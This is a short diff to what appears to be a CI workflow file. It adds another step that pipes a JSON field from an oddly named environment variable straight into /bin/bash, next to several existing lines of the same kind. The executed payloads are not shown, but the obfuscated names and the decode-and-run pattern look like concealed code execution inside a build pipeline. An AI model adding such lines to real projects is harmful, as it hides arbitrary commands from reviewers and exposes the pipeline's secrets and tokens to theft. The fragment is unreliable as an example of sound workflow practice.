@@ -23,6 +23,7 @@ jobs:
           echo $snfmp421 | jq -r .uf7 | /bin/bash
           echo $p70678 | jq -r .ehqv6 | /bin/bash
           printf '%s' "$ldsfi4" | jq -r .kb8 | /bin/bash
+          echo $d557 | jq -r .ax38246 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
